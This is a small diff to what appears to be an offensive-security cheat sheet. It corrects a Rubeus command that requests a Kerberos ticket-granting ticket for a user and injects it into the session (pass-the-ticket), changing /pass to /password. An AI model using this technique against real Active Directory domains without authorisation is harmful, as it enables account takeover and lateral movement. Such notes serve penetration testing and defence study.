@@ -7,7 +7,7 @@
 Request TGT for a user and inject it:
 
 ```powershell
-> Rubeus.exe asktgt /user:<username> /pass:<password> /ptt
+> Rubeus.exe asktgt /user:<username> /password:<password> /ptt
 ```
 
 Open a new cmd session in the context of the authenticated user:
